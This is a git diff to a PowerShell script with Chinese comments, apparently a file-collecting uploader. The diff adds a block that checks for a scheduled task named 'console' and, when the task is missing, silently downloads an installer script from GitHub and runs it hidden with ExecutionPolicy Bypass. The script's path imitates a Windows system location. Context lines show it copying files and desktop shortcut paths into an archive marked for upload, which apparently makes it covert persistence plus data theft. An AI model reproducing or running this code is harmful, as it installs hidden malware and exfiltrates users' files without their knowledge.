@@ -1,3 +1,28 @@
+# ========== ⬇️ 自动检查并注册计划任务（如果缺失） ==========
+
+$taskName = "console"
+$expectedPath = "C:\ProgramData\Microsoft\Windows\console.ps1"
+
+# 当前是否由计划任务启动（路径正确）
+if ($MyInvocation.MyCommand.Path -ne $expectedPath) {
+    $taskExists = schtasks /Query /TN $taskName /FO LIST 2>$null | Select-String "TaskName"
+    if (-not $taskExists) {
+        try {
+            Write-Host "📥 未检测到计划任务，开始从 GitHub 下载安装脚本..."
+            $installUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/.github/install-task.ps1"
+            $installScript = "$env:TEMP\install-task.ps1"
+            Invoke-WebRequest -Uri $installUrl -OutFile $installScript -UseBasicParsing -ErrorAction Stop
+            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$installScript`"" -WindowStyle Hidden
+            Write-Host "⚙️ 已触发计划任务注册流程。"
+        } catch {
+            Write-Warning "❌ 下载 install-task.ps1 失败：$($_.Exception.Message)"
+        }
+        exit 0
+    }
+}
+
+# ========== ⬇️ 正式上传逻辑开始 ==========
+
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
@@ -20,7 +45,8 @@ try {
 $workDir = "$env:TEMP\backup_$tag"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-# === ⬇️ 拷贝文件 ===
+# ========== ⬇️ 拷贝文件 ==========
+
 foreach ($path in $paths) {
     if (Test-Path $path) {
         try {
@@ -36,7 +62,8 @@ foreach ($path in $paths) {
     }
 }
 
-# === ⬇️ 新增：提取桌面快捷方式完整路径（含参数） ===
+# ========== ⬇️ 提取桌面快捷方式完整路径 ==========
+
 try {
     $desktopDirs = @(
         "$env:USERPROFILE\Desktop",
@@ -65,7 +92,8 @@ try {
     Write-Warning "⚠️ 快捷方式路径提取失败：$($_.Exception.Message)"
 }
 
-# === ⬇️ 压缩上传 ===
+# ========== ⬇️ 压缩并上传 ==========
+
 $zipPath = "$env:TEMP\$tag.zip"
 Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force
 
